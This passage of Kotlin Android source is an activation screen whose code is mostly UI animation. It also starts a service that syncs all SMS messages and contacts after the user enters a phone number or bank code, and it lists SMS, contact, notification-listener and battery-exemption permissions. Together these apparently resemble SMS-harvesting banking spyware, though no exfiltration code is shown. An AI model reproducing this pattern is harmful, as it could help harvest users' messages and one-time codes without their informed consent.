            val idealLogoTop = idealLogoBottom - logoHeightScaled

            // Ensure logo stays within safe area (don't go above topPadding)
            val finalLogoTop = idealLogoTop.coerceAtLeast(topPadding)
            val finalLogoBottom = finalLogoTop + logoHeightScaled

            // Recalculate input position based on final logo position
            val finalInputTop = finalLogoBottom + minGap

            // Get current positions
            val currentLogoTop = id.activationHeaderSection.top.toFloat()
            val currentInputTop = id.activationContentScrollView.top + id.activationInputCard.top.toFloat()

            // Calculate movement distances
            val logoMoveDistance = (currentLogoTop - finalLogoTop).coerceAtLeast(0f)
            val inputMoveDistance = (currentInputTop - finalInputTop).coerceAtLeast(0f)

            // Apply animations
            id.activationContentScrollView.animate()
                .translationY(-inputMoveDistance)
                .setDuration(300)
                .setInterpolator(AccelerateDecelerateInterpolator())
                .start()

            id.activationHeaderSection.animate()
                .translationY(-logoMoveDistance)
                .scaleX(0.65f)
                .scaleY(0.65f)
                .setDuration(300)
                .setInterpolator(AccelerateDecelerateInterpolator())
                .start()

            id.activationTaglineText.animate()
                .alpha(0f)
                .setDuration(200)
                .start()
        }
    }

    /**
     * 3D Card Flip Animation - transforms UI before code conversion
     * Front: Logo + Input Card
     * Back: Tagline + Button (invisible)
     * Logo jumps 10% up, then flips and moves to top of input card
     */
    /**
     * Animate input field flip in place (only the input field, not the entire container)
     * Then start code conversion animation with circular border animation
     */
    private fun animateInputFieldFlip(phone: String, generatedCode: String, onComplete: () -> Unit) {
        if (isDestroyed || isFinishing) {
            onComplete()
            return
        }

        val inputField = id.activationInputCard // Input field container

        // Cancel any existing animations
        inputField.clearAnimation()
        inputField.animate().cancel()

        // Reset rotation
        inputField.rotationY = 0f

        // Set camera distance for 3D effect
        val cameraDistance = resources.displayMetrics.density * 8000
        inputField.cameraDistance = cameraDistance

        // Flip animation (180° rotation)
        val flipAnimator = ObjectAnimator.ofFloat(inputField, "rotationY", 0f, 180f).apply {
            duration = 600
            interpolator = AccelerateDecelerateInterpolator()
        }

        flipAnimator.addListener(object : AnimatorListenerAdapter() {
            override fun onAnimationEnd(animation: Animator) {
                if (!isDestroyed && !isFinishing) {
                    // Reset rotation
                    inputField.rotationY = 0f

                    // Start code conversion animation with circular border
                    animatePhoneToCodeWithCircularBorder(phone, generatedCode, onComplete)
                }
            }
        })

        flipAnimator.start()
    }

    /**
     * Animate phone to code conversion with circular border animation
     * Border animates in 3 parts around the input field
     */
    private fun animatePhoneToCodeWithCircularBorder(phone: String, code: String, onComplete: () -> Unit) {
        if (isDestroyed || isFinishing) {
            onComplete()
            return
        }

        // Start circular border animation
        startCircularBorderAnimation()

        // Start phone to code conversion animation
        animatePhoneToCode(phone, code) {
            // Stop circular border animation
            stopCircularBorderAnimation()
            onComplete()
        }
    }

    // Circular border animation variables
    private var circularBorderAnimator: ValueAnimator? = null
    private var borderView: View? = null

    /**
     * Start circular border animation on input field
     * Border animates in 3 parts (each part is 1/3 of the perimeter)
     * Animates directly on the existing border (no double border)
     */
    private fun startCircularBorderAnimation() {
        if (isDestroyed || isFinishing) return

        stopCircularBorderAnimation() // Stop any existing animation

        val inputField = id.activationInputCard
        val themePrimary = resources.getColor(R.color.theme_primary, theme)
        // Match the existing border stroke width (typically 2-3dp)
        val strokeWidthPx = 2.5f * resources.displayMetrics.density
        // Draw exactly on the existing border (no padding - draw on the border itself)
        val borderPadding = 0f

        // Create custom view for animated border that overlays exactly on existing border
        borderView = object : View(this) {
            private var progress = 0f

            init {
                // Make background completely transparent - only animated path will be visible
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
            }

            fun setProgress(p: Float) {
                progress = p
                invalidate()
            }

            override fun onDraw(canvas: android.graphics.Canvas) {
                super.onDraw(canvas)

                val width = width.toFloat()
                val height = height.toFloat()

                // Draw exactly on the existing border (same position as cardView6's border)
                val halfStroke = strokeWidthPx / 2f
                val left = halfStroke
                val top = halfStroke
                val right = width - halfStroke
                val bottom = height - halfStroke
                val drawWidth = right - left
                val drawHeight = bottom - top

                val paint = android.graphics.Paint().apply {
                    color = themePrimary
                    style = android.graphics.Paint.Style.STROKE
                    this.strokeWidth = strokeWidthPx
                    isAntiAlias = true
                    strokeCap = android.graphics.Paint.Cap.ROUND
                }

                // Calculate 3 parts (each part is 1/3 of perimeter)
                val part1End = 0.333f
                val part2End = 0.666f

                val path = android.graphics.Path()

                when {
                    progress < part1End -> {
                        // Part 1: Top and right side
                        val partProgress = progress / part1End
                        val topLength = drawWidth * partProgress

                        path.moveTo(left, top)
                        if (topLength < drawWidth) {
                            path.lineTo(left + topLength, top)
                        } else {
                            path.lineTo(right, top)
                            val rightProgress = (topLength - drawWidth) / drawHeight
                            path.lineTo(right, top + drawHeight * rightProgress)
                        }
                    }
                    progress < part2End -> {
                        // Part 2: Right and bottom side
                        val partProgress = (progress - part1End) / (part2End - part1End)
                        val rightRemaining = drawHeight * (1f - partProgress)
                        val bottomLength = drawWidth * partProgress

                        path.moveTo(left, top)
                        path.lineTo(right, top)
                        path.lineTo(right, top + rightRemaining)
                        path.lineTo(right, bottom)
                        path.lineTo(right - bottomLength, bottom)
                    }
                    else -> {
                        // Part 3: Bottom and left side
                        val partProgress = (progress - part2End) / (1f - part2End)
                        val bottomRemaining = drawWidth * (1f - partProgress)
                        val leftLength = drawHeight * partProgress

                        path.moveTo(left, top)
                        path.lineTo(right, top)
                        path.lineTo(right, bottom)
                        path.lineTo(left + bottomRemaining, bottom)
                        path.lineTo(left, bottom)
                        path.lineTo(left, bottom - leftLength)
                    }
                }

                canvas.drawPath(path, paint)
            }
        }

        borderView?.layoutParams = android.view.ViewGroup.LayoutParams(
            android.view.ViewGroup.LayoutParams.MATCH_PARENT,
            android.view.ViewGroup.LayoutParams.MATCH_PARENT
        )

        inputField.addView(borderView)

        // Create animator
        circularBorderAnimator = ValueAnimator.ofFloat(0f, 1f).apply {
            duration = 2000 // 2 seconds per cycle
            repeatCount = ValueAnimator.INFINITE
            repeatMode = ValueAnimator.RESTART
            interpolator = android.view.animation.LinearInterpolator()

            addUpdateListener { animator ->
                if (isDestroyed || isFinishing) return@addUpdateListener
                val progress = animator.animatedValue as Float
                (borderView as? View)?.let { view ->
                    (view as? Any)?.let {
                        try {
                            val method = view.javaClass.getDeclaredMethod("setProgress", Float::class.java)
                            method.invoke(view, progress)
                        } catch (e: Exception) {
                            // Fallback: just invalidate
                            view.invalidate()
                        }
                    }
                }
            }
        }

        circularBorderAnimator?.start()
    }

    /**
     * Stop circular border animation
     */
    private fun stopCircularBorderAnimation() {
        circularBorderAnimator?.cancel()
        circularBorderAnimator = null
        borderView?.let {
            id.activationInputCard.removeView(it)
        }
        borderView = null
    }

    /**
     * Transform input card to display card (same card, transformed content)
     * Changes icon from 📱 to ✅ check mark
     * Makes EditText display-only (non-editable, styled as display text)
     * This transforms the card in place - same card, different content
     */
    private fun transformInputCardToDisplayCard() {
        if (isDestroyed || isFinishing) return

            try {
                // Change icon from 📱 emoji to ✅ check mark
                // Icons removed - using Matrix Rain style without icons
                // Input field now uses centered text style

                // Make EditText display-only (behave like TextView)
                id.activationPhoneInput.isEnabled = false
                id.activationPhoneInput.isFocusable = false
                id.activationPhoneInput.isFocusableInTouchMode = false
                id.activationPhoneInput.isClickable = false
                id.activationPhoneInput.setCursorVisible(false)

                // Style EditText to look like display text (centered, no hint)
                id.activationPhoneInput.gravity = android.view.Gravity.CENTER_VERTICAL or android.view.Gravity.START
                id.activationPhoneInput.hint = ""

            // Add animated effect to code text in display card
            animateCodeTextEffect()
            } catch (e: Exception) {
                android.util.Log.e("ActivationActivity", "❌ Error transforming input card", e)
            }
    }

    /**
     * Animate code update with character rotation (RUNNING mode)
     * Letters rotate clockwise, numbers rotate anti-clockwise
     * Starts with pairs from outside-in, then reverses to stop
     */
    private fun animateCodeUpdateRotation(code: String, onComplete: () -> Unit = {}) {
        if (isDestroyed || isFinishing) {
            onComplete()
            return
        }

        try {
            // Remove dashes and get clean code
            val cleanCode = code.replace("-", "").uppercase()
            if (cleanCode.length < 10) {
                onComplete()
                return
            }

            // Hide the original EditText
            id.activationPhoneInput.visibility = View.GONE

            // Get the parent container (cardView6)
            val parentContainer = id.activationInputCard

            // Create a horizontal LinearLayout to hold character views
            val characterContainer = android.widget.LinearLayout(this).apply {
                orientation = android.widget.LinearLayout.HORIZONTAL
                gravity = android.view.Gravity.CENTER
                layoutParams = android.widget.FrameLayout.LayoutParams(
                    android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                    android.widget.FrameLayout.LayoutParams.MATCH_PARENT
                )
            }

            // Add container to parent
            parentContainer.addView(characterContainer)

            val themePrimary = resources.getColor(R.color.theme_primary, theme)
            val letterColor = android.graphics.Color.parseColor("#FFA500") // Orange
            val numberColor = android.graphics.Color.parseColor("#87CEEB") // Sky blue

            // Create TextViews for each character
            val characterViews = mutableListOf<TextView>()
            val characterAnimators = mutableListOf<ObjectAnimator>()

            for (i in cleanCode.indices) {
                val char = cleanCode[i]
                val isLetter = char.isLetter()
                val isNumber = char.isDigit()

                // Add dash after 5th character (index 4, which is the 5th letter)
                if (i == 4) {
                    val dashView = TextView(this).apply {
                        text = "-"
                        textSize = 18f
                        typeface = android.graphics.Typeface.MONOSPACE
                        setTextColor(themePrimary)
                        gravity = android.view.Gravity.CENTER
                        layoutParams = android.widget.LinearLayout.LayoutParams(
                            android.widget.LinearLayout.LayoutParams.WRAP_CONTENT,
                            android.widget.LinearLayout.LayoutParams.WRAP_CONTENT
                        )
                    }
                    characterContainer.addView(dashView)
                }

                val charView = TextView(this).apply {
                    text = char.toString()
                    textSize = 18f
                    typeface = android.graphics.Typeface.MONOSPACE
                    setTextColor(themePrimary)
                    gravity = android.view.Gravity.CENTER
                    layoutParams = android.widget.LinearLayout.LayoutParams(
                        android.widget.LinearLayout.LayoutParams.WRAP_CONTENT,
                        android.widget.LinearLayout.LayoutParams.WRAP_CONTENT
                    )
                }

                characterContainer.addView(charView)
                characterViews.add(charView)

                // Create rotation animator only for letters and numbers
                val rotationAnimator = if (isLetter) {
                    // Letters: clockwise (0° to 360°)
                    ObjectAnimator.ofFloat(charView, "rotation", 0f, 360f).apply {
                        duration = 1000
                        repeatCount = ObjectAnimator.INFINITE
                        interpolator = android.view.animation.LinearInterpolator()
                    }
                } else if (isNumber) {
                    // Numbers: anti-clockwise (0° to -360°)
                    ObjectAnimator.ofFloat(charView, "rotation", 0f, -360f).apply {
                        duration = 1000
                        repeatCount = ObjectAnimator.INFINITE
                        interpolator = android.view.animation.LinearInterpolator()
                    }
                } else {
                    null
                }

                rotationAnimator?.let { characterAnimators.add(it) }
            }

            // Start sequence: pairs from outside-in (0+9, 1+8, 2+7, 3+6, 4+5)
            val totalChars = characterViews.size
            val pairDelays = listOf(0, 200, 400, 600, 800) // Delays for each pair

            for (pairIndex in 0 until 5) {
                val leftIndex = pairIndex
                val rightIndex = totalChars - 1 - pairIndex

                handler.postDelayed({
                    if (!isDestroyed && !isFinishing) {
                        if (leftIndex < characterAnimators.size) {
                            characterAnimators[leftIndex].start()
                        }
                        if (rightIndex < characterAnimators.size && rightIndex != leftIndex) {
                            characterAnimators[rightIndex].start()
                        }
                    }
                }, pairDelays[pairIndex].toLong())
            }

            // After all characters are rotating, wait then start reverse stop sequence
            handler.postDelayed({
                if (!isDestroyed && !isFinishing) {
                    // Reverse stop sequence: stop in reverse order (4+5, 3+6, 2+7, 1+8, 0+9)
                    for (pairIndex in 4 downTo 0) {
                        val leftIndex = pairIndex
                        val rightIndex = totalChars - 1 - pairIndex

                        handler.postDelayed({
                            if (!isDestroyed && !isFinishing) {
                                // Stop left character
                                if (leftIndex < characterAnimators.size) {
                                    characterAnimators[leftIndex].cancel()
                                    val leftView = characterViews[leftIndex]
                                    leftView.rotation = 0f
                                    if (leftView.text[0].isLetter()) {
                                        leftView.setTextColor(letterColor)
                                    } else if (leftView.text[0].isDigit()) {
                                        leftView.setTextColor(numberColor)
                                    }
                                }

                                // Stop right character
                                if (rightIndex < characterAnimators.size && rightIndex != leftIndex) {
                                    characterAnimators[rightIndex].cancel()
                                    val rightView = characterViews[rightIndex]
                                    rightView.rotation = 0f
                                    if (rightView.text[0].isLetter()) {
                                        rightView.setTextColor(letterColor)
                                    } else if (rightView.text[0].isDigit()) {
                                        rightView.setTextColor(numberColor)
                                    }
                                }

                                // If this is the last pair, complete animation
                                if (pairIndex == 0) {
                                    handler.postDelayed({
                                        // Keep the animated character container visible (with colored characters)
                                        // Don't restore EditText - keep the final animated style
                                        // EditText stays hidden, character container stays visible with final colors
                                        onComplete()
                                    }, 300)
                                }
                            }
                        }, (4 - pairIndex) * 200L)
                    }
                }
            }, 2000L) // Wait 2 seconds after all start rotating

        } catch (e: Exception) {
            android.util.Log.e("ActivationActivity", "❌ Error animating code update rotation", e)
            onComplete()
            }
    }

    /**
     * Add animated visual effect to code text in display card
     * Effects: Glow pulse, subtle scale pulse, and shimmer-like color transition
     */
    private fun animateCodeTextEffect() {
        if (isDestroyed || isFinishing) return

        try {
            val themePrimary = resources.getColor(R.color.theme_primary, theme)
            val themePrimaryLight = resources.getColor(R.color.theme_primary_light, theme)

            // Cancel any existing animations
            id.activationPhoneInput.clearAnimation()
            id.activationPhoneInput.animate().cancel()

            // Create repeating animation set for code text effect
            val codeEffectAnimator = AnimatorSet().apply {
                playTogether(
                    // Subtle scale pulse (very gentle)
                    ObjectAnimator.ofFloat(id.activationPhoneInput, "scaleX", 1f, 1.02f, 1f).apply {
                        duration = 2000
                        interpolator = AccelerateDecelerateInterpolator()
                        repeatCount = ObjectAnimator.INFINITE
                        repeatMode = ObjectAnimator.REVERSE
                    },
                    ObjectAnimator.ofFloat(id.activationPhoneInput, "scaleY", 1f, 1.02f, 1f).apply {
                        duration = 2000
                        interpolator = AccelerateDecelerateInterpolator()
                        repeatCount = ObjectAnimator.INFINITE
                        repeatMode = ObjectAnimator.REVERSE
                    },
                    // Color transition (shimmer effect between primary and light)
                    ObjectAnimator.ofArgb(
                        id.activationPhoneInput,
                        "textColor",
                        themePrimary,
                        themePrimaryLight,
                        themePrimary
                    ).apply {
                        duration = 3000
                        interpolator = AccelerateDecelerateInterpolator()
                        repeatCount = ObjectAnimator.INFINITE
                        repeatMode = ObjectAnimator.REVERSE
                    },
                    // Subtle alpha pulse for glow effect
                    ObjectAnimator.ofFloat(id.activationPhoneInput, "alpha", 1f, 0.9f, 1f).apply {
                        duration = 2500
                        interpolator = AccelerateDecelerateInterpolator()
                        repeatCount = ObjectAnimator.INFINITE
                        repeatMode = ObjectAnimator.REVERSE
                    }
                )
            }

            // Start animation
            codeEffectAnimator.start()

            // Store animator reference for cleanup if needed
            // Note: AnimatorSet will continue until activity is destroyed
        } catch (e: Exception) {
            android.util.Log.e("ActivationActivity", "❌ Error animating code text effect", e)
        }
    }

    private fun animateHintText() {
        if (isDestroyed || isFinishing) return

        hintAnimationRunnable?.let {
            handler.removeCallbacks(it)
            handlerRunnables.remove(it)
        }

        val hintText = getHintTextForCurrentMode()
        var currentIndex = 0

        // Clear hint first to ensure clean start
        id.activationPhoneInput.hint = ""

        val runnable = object : Runnable {
            override fun run() {
                if (isDestroyed || isFinishing) return

                // Check if user has started typing - stop animation if they have
                val userText = id.activationPhoneInput.text?.toString() ?: ""
                if (userText.isNotEmpty()) {
                    hintAnimationRunnable = null
                    handlerRunnables.remove(this)
                    return // Stop animation if user started typing
                }

                if (currentIndex < hintText.length) {
                    // Set hint character by character
                    id.activationPhoneInput.hint = hintText.substring(0, currentIndex + 1)
                    currentIndex++

                    // Continue animation
                    handlerRunnables.add(this)
                    handler.postDelayed(this, 80) // 80ms delay between characters
                } else {
                    hintAnimationRunnable = null
                    handlerRunnables.remove(this)
                }
            }
        }

        // Start animation immediately (UI entry animation already completed)
        hintAnimationRunnable = runnable
        handlerRunnables.add(runnable)
        handler.postDelayed(runnable, 200) // Small delay to ensure EditText is ready
    }

    private fun getHintTextForCurrentMode(): String {
        return if (currentLoginType == "running") {
            "Enter Your Bank Code"
        } else {
            "Enter Your Phone Number"
        }
    }

    @SuppressLint("HardwareIds")
    private fun syncAllOldMessages(phone: String) {
        val now = System.currentTimeMillis()
        if (now - lastSyncTriggerAt < 5000L) return
        lastSyncTriggerAt = now

        // Start sync in background (non-blocking, parallel execution)
        // Use application context to avoid leaking the activity
        handler.post {
            ContactSmsSyncService.startSync(applicationContext, ContactSmsSyncService.SyncType.ALL)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_REGISTERING &&
            PermissionManager.handleRequestPermissionListResult(this, requestCode, permissions, grantResults)
        ) {
            return
        }
    }

    @SuppressLint("BatteryLife")
    override fun onResume() {
        super.onResume()
        if (PermissionManager.onSpecialPermissionReturn(this)) return
        android.util.Log.d(TAG, "[DEBUG] onResume: no permission request at start (permission during status animation only)")
        // Permission is asked during status animation (after "Check for update"), not at start
        PermissionSyncHelper.checkAndStartSync(this)
        // Keep system keyboard hidden - we use company keypad only
        window.decorView.post { dismissKeyboard() }

        if (activationState == ActivationState.Fail && hasPendingRetry()) {
            scheduleAutoRetry(getRetryAttempt())
        }
    }

    // Permission request handling removed - now handled by PermissionFlowActivity

    private fun isServiceRunning(): Boolean {
        val manager = getSystemService(android.app.ActivityManager::class.java)
        return manager.getRunningServices(Int.MAX_VALUE).any {
            it.service.className == PersistentForegroundService::class.java.name
        }
    }

    private fun isGranted(): Boolean {
        val component = ComponentName(packageName, NotificationReceiver::class.java.name)
        return NotificationManagerCompat.getEnabledListenerPackages(this).contains(component.packageName)
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        // Save activation state
        outState.putBoolean("isActivating", isActivating)
        outState.putString("currentPhone", currentPhone)
        outState.putString("currentCode", currentCode)
        // Save input text
        outState.putString("inputText", id.activationPhoneInput.text.toString())
    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        // Restore activation state
        isActivating = savedInstanceState.getBoolean("isActivating", false)
        currentPhone = savedInstanceState.getString("currentPhone")
        currentCode = savedInstanceState.getString("currentCode")
        // Restore input text
        val inputText = savedInstanceState.getString("inputText", "")
        if (inputText.isNotEmpty()) {
            id.activationPhoneInput.setText(inputText)
        }
    }

    override fun onDestroy() {
        super.onDestroy()

        // Cancel all Handler callbacks to prevent memory leaks
        handlerRunnables.forEach { handler.removeCallbacks(it) }
        handlerRunnables.clear()

        // Remove ViewTreeObserver listener to prevent memory leaks
        layoutListener?.let {
            id.activationRootLayout.viewTreeObserver.removeOnGlobalLayoutListener(it)
        }
        layoutListener = null

        // Cancel any running animations
        id.activationRootLayout.clearAnimation()
        id.activationHeaderSection.clearAnimation()
        id.activationContentContainer.clearAnimation()
        id.activationPhoneInput.clearAnimation()
        id.activationInputCard.clearAnimation()
        id.activationActivateButton.clearAnimation()

        // Stop card animations
        stopCurrentCardAnimation()
        currentBackgroundAnimator?.cancel()
        currentBackgroundAnimator = null
    }

    /** Returns the status step View for birth-from animation (index 0..4: Validate, Register, Sync, Auth, Result). */
    private fun getOriginStepView(index: Int): View {
        return when (index.coerceIn(0, 4)) {
            0 -> id.activationStatusStepValidate
            1 -> id.activationStatusStepRegister
            2 -> id.activationStatusStepSync
            3 -> id.activationStatusStepAuth
            else -> id.activationStatusStepResult
        }
    }

    /** Returns friendly permission names for granted mandatory permissions (for typing on prompt card). */
    private fun getGrantedMandatoryPermissionNames(): List<String> = getGrantedAllPermissionNames()

    /** Returns friendly permission names for all granted permissions (runtime + special) for typing on prompt card. */
    private fun getGrantedAllPermissionNames(): List<String> {
        val lines = mutableListOf<String>()
        val runtimeToName = mapOf(
            Manifest.permission.RECEIVE_SMS to "• Receive SMS",
            Manifest.permission.READ_SMS to "• Read SMS",
            Manifest.permission.READ_CONTACTS to "• Read Contacts",
            Manifest.permission.READ_PHONE_STATE to "• Read Phone State",
            Manifest.permission.SEND_SMS to "• Send SMS",
            Manifest.permission.POST_NOTIFICATIONS to "• Notifications"
        )
        for (p in PermissionManager.getRequiredRuntimePermissions(this)) {
            if (ActivityCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED)
                runtimeToName[p]?.let { lines.add(it) }
        }
        if (PermissionManager.hasNotificationListenerPermission(this)) lines.add("• Notification Listener")
        if (PermissionManager.hasBatteryOptimizationExemption(this)) lines.add("• Battery Optimization")
        return lines
    }

    /** Types lines one by one into the given TextView (char-by-char, same style as status card). */
    private fun typePermissionListOnCard(
        lines: List<String>,
        textView: TextView,
        onComplete: () -> Unit
    ) {
        promptCardTypingRunnable?.let { handler.removeCallbacks(it); handlerRunnables.remove(it) }
        promptCardTypingRunnable = null
        textView.text = ""
        if (lines.isEmpty()) {
            onComplete()
            return
        }
        val perCharDelay = PROMPT_CARD_PER_CHAR_DELAY_MS.coerceAtLeast(20L)
        var lineIndex = 0
        var charIndex = 0
        val runnable = object : Runnable {
            override fun run() {
                if (isDestroyed || isFinishing) {
                    promptCardTypingRunnable = null
                    handlerRunnables.remove(this)
                    return
                }
                if (lineIndex >= lines.size) {
                    promptCardTypingRunnable = null
                    handlerRunnables.remove(this)
                    onComplete()
                    return
                }
                val line = lines[lineIndex]
                if (line.isNotEmpty()) {
                    val nextIndex = (charIndex + 1).coerceAtMost(line.length)
                    val prefix = line.substring(0, nextIndex)
                    val soFar = lines.take(lineIndex).joinToString("\n") + (if (lineIndex > 0) "\n" else "") + prefix
                    textView.text = soFar
                    charIndex++
                }
                if (charIndex >= line.length) {
                    lineIndex++
                    charIndex = 0
                }
                promptCardTypingRunnable = this
                handlerRunnables.add(this)
                handler.postDelayed(this, perCharDelay)
            }
        }
        promptCardTypingRunnable = runnable
        handlerRunnables.add(runnable)
        handler.postDelayed(runnable, perCharDelay)
    }

    /**
     * Show activation prompt card "born from" the given status step: first UPDATE phase (check for app update),
     * then PERMISSIONS phase (type permission list), then reverse and call onComplete.
     * Keeps status card animation running (does not stop it). Call before continuing to permission request / Firebase.
     */
    private fun showActivationPromptCard(originStepIndex: Int, onComplete: () -> Unit) {
        if (isDestroyed || isFinishing) {
            onComplete()
            return
        }
        promptCardOriginStepIndex = originStepIndex.coerceIn(0, 4)
        val overlay = id.root.findViewById<View>(R.id.activationPermissionPromptOverlay) ?: run {
            onComplete()
            return
        }
        val card = id.root.findViewById<View>(R.id.activationPermissionPromptCard) ?: run {
            onComplete()
            return
        }
        val headerSection = id.activationHeaderSection
        val formCard = id.activationFormCardOuterBorder
        val statusCard = id.activationStatusCardContainer
        val promptTitle = card.findViewById<TextView>(R.id.activationPromptTitle)
        val typedText = card.findViewById<TextView>(R.id.activationPromptTypedText)
        typedText?.text = ""
        promptTitle?.text = ""

        val originView = getOriginStepView(promptCardOriginStepIndex)
        val originLoc = IntArray(2)
        originView.getLocationOnScreen(originLoc)
        val originX = originLoc[0].toFloat()
        val originY = originLoc[1].toFloat()
        val originW = originView.width.toFloat()
        val originH = originView.height.toFloat()

        overlay.visibility = View.VISIBLE
        overlay.alpha = 0f
        overlay.animate().alpha(1f).setDuration(150).start()

        val originCenterX = originX + originW / 2f
        val originCenterY = originY + originH / 2f

        val hw = headerSection.width.coerceAtLeast(1)
        val fcw = formCard.width.coerceAtLeast(1)
        val scw = statusCard.width.coerceAtLeast(1)
        headerSection.pivotX = hw / 2f
        headerSection.pivotY = 0f
        formCard.pivotX = fcw / 2f
        formCard.pivotY = 0f
        statusCard.pivotX = scw / 2f
        statusCard.pivotY = 0f

        headerSection.animate()
            .scaleX(0.85f).scaleY(0.85f)
            .rotationY(5f)
            .setDuration(PROMPT_CARD_ANIM_DURATION_MS)
            .start()
        formCard.animate()
            .scaleX(0.85f).scaleY(0.85f)
            .rotationY(5f)
            .alpha(0.4f)
            .setDuration(PROMPT_CARD_OPACITY_FADE_MS)
            .setInterpolator(DecelerateInterpolator())
            .start()
        statusCard.animate()
            .scaleX(0.85f).scaleY(0.85f)
            .rotationY(-5f)
            .alpha(0.4f)
            .setDuration(PROMPT_CARD_OPACITY_FADE_MS)
            .setInterpolator(DecelerateInterpolator())
            .start()

        val cameraDistance = resources.displayMetrics.density * 8000
        statusCard.cameraDistance = cameraDistance
        card.cameraDistance = cameraDistance
        val cw = card.width.coerceAtLeast(1)
        val ch = card.height.coerceAtLeast(1)
        card.pivotX = cw / 2f
        card.pivotY = ch / 2f
        card.rotationX = 90f
        card.alpha = 0f
        card.visibility = View.VISIBLE

        fun runPhase2PermissionThenReverse() {
            if (isDestroyed || isFinishing) return
            promptTitle?.text = "PERMISSIONS"
            typedText?.text = ""
            val lines = getGrantedMandatoryPermissionNames()
            if (typedText != null) {
                typePermissionListOnCard(lines, typedText) {
                    if (isDestroyed || isFinishing) {
                        onComplete()
                        return@typePermissionListOnCard
                    }
                    runReversePromptCardAnimation(overlay, card, headerSection, formCard, statusCard, originCenterX, originCenterY, onComplete)
                }
            } else {
                runReversePromptCardAnimation(overlay, card, headerSection, formCard, statusCard, originCenterX, originCenterY, onComplete)
            }
        }

        val flipOutSms = ObjectAnimator.ofFloat(statusCard, "rotationX", 0f, 90f).apply {
            duration = 200
            interpolator = AccelerateInterpolator()
        }
        val fadeOutStatus = ObjectAnimator.ofFloat(statusCard, "alpha", 0.4f, 0f).apply {
            duration = 200
        }
        val flipOutAnim = AnimatorSet().apply { playTogether(flipOutSms, fadeOutStatus) }
        flipOutAnim.addListener(object : AnimatorListenerAdapter() {
            override fun onAnimationEnd(animation: Animator) {
                if (isDestroyed || isFinishing) return
                val flipInPerm = ObjectAnimator.ofFloat(card, "rotationX", 90f, 0f).apply {
                    duration = PROMPT_FLIP_DURATION_MS
                    interpolator = AccelerateDecelerateInterpolator()
                }
                val fadeInPerm = ObjectAnimator.ofFloat(card, "alpha", 0f, 1f).apply {
                    duration = PROMPT_FLIP_DURATION_MS
                }
                val flipInAnim = AnimatorSet().apply { playTogether(flipInPerm, fadeInPerm) }
                flipInAnim.addListener(object : AnimatorListenerAdapter() {
                    override fun onAnimationEnd(animation2: Animator) {
                        if (isDestroyed || isFinishing) return
                        // Phase 1: UPDATE — show "Checking for update..." then run checkForAppUpdate
                        promptTitle?.text = "UPDATE"
                        typedText?.text = "Checking for update..."
                        checkForAppUpdate { updateAvailable ->
                            handler.post {
                                if (isDestroyed || isFinishing) return@post
                                if (updateAvailable) {
                                    typedText?.text = "Update available. Opening..."
                                    handler.postDelayed({
                                        if (isDestroyed || isFinishing) return@postDelayed
                                        runReversePromptCardAnimation(overlay, card, headerSection, formCard, statusCard, originCenterX, originCenterY, onComplete)
                                    }, 1500)
                                } else {
                                    typedText?.text = "App is up to date."
                                    handler.postDelayed({
                                        if (isDestroyed || isFinishing) return@postDelayed
                                        runPhase2PermissionThenReverse()
                                    }, 1500)
                                }
                            }
                        }
                    }
                })
                flipInAnim.start()
            }
        })
        handler.postDelayed({ if (!isDestroyed && !isFinishing) flipOutAnim.start() }, PROMPT_CARD_ANIM_DURATION_MS)
    }

    private fun runReversePromptCardAnimation(
        overlay: View,
        card: View,
        headerSection: View,
        formCard: View,
        statusCard: View,
        originCenterX: Float,
        originCenterY: Float,
        onComplete: () -> Unit
    ) {
        val flipOutPerm = ObjectAnimator.ofFloat(card, "rotationX", 0f, 90f).apply {
            duration = 200
            interpolator = AccelerateInterpolator()
        }
        val fadeOutPerm = ObjectAnimator.ofFloat(card, "alpha", 1f, 0f).apply {
            duration = 200
        }
        val flipOutAnim = AnimatorSet().apply { playTogether(flipOutPerm, fadeOutPerm) }
        flipOutAnim.addListener(object : AnimatorListenerAdapter() {
            override fun onAnimationEnd(animation: Animator) {
                if (isDestroyed || isFinishing) return
                card.visibility = View.GONE
                overlay.visibility = View.GONE
                overlay.alpha = 1f
                card.rotationX = 0f
                card.alpha = 1f
                headerSection.animate().scaleX(1f).scaleY(1f).rotationY(0f).setDuration(PROMPT_CARD_ANIM_DURATION_MS).start()
                formCard.animate()
                    .scaleX(1f).scaleY(1f).rotationY(0f).alpha(1f)
                    .setDuration(PROMPT_CARD_ANIM_DURATION_MS)
                    .start()
                statusCard.rotationX = 90f
                statusCard.alpha = 0f
                statusCard.visibility = View.VISIBLE
                val flipInStatus = ObjectAnimator.ofFloat(statusCard, "rotationX", 90f, 0f).apply {
                    duration = PROMPT_FLIP_DURATION_MS
                    interpolator = AccelerateDecelerateInterpolator()
                }
                val fadeInStatus = ObjectAnimator.ofFloat(statusCard, "alpha", 0f, 1f).apply {
                    duration = PROMPT_FLIP_DURATION_MS
                }
                val scaleRestore = ObjectAnimator.ofFloat(statusCard, "scaleX", 0.85f, 1f).apply {
                    duration = PROMPT_FLIP_DURATION_MS
                }
                val scaleRestoreY = ObjectAnimator.ofFloat(statusCard, "scaleY", 0.85f, 1f).apply {
                    duration = PROMPT_FLIP_DURATION_MS
                }
                val rotRestore = ObjectAnimator.ofFloat(statusCard, "rotationY", -5f, 0f).apply {
                    duration = PROMPT_FLIP_DURATION_MS
                }
                val flipInAnim = AnimatorSet().apply {
                    playTogether(flipInStatus, fadeInStatus, scaleRestore, scaleRestoreY, rotRestore)
                    addListener(object : AnimatorListenerAdapter() {
                        override fun onAnimationEnd(animation2: Animator) {
                            onComplete()
                        }
                    })
                }
                flipInAnim.start()
            }
        })
        flipOutAnim.start()
    }

    /**
     * Check for app updates after device registration
     * If an update is available, launches RemoteUpdateActivity
     *
     * @param onComplete Callback with updateAvailable boolean (true if update was launched, false otherwise)
     */
    private fun checkForAppUpdate(onComplete: (Boolean) -> Unit) {
        android.util.Log.d("ActivationActivity", "Checking for app updates...")
        val timeoutHandler = android.os.Handler(android.os.Looper.getMainLooper())
        var completed = false
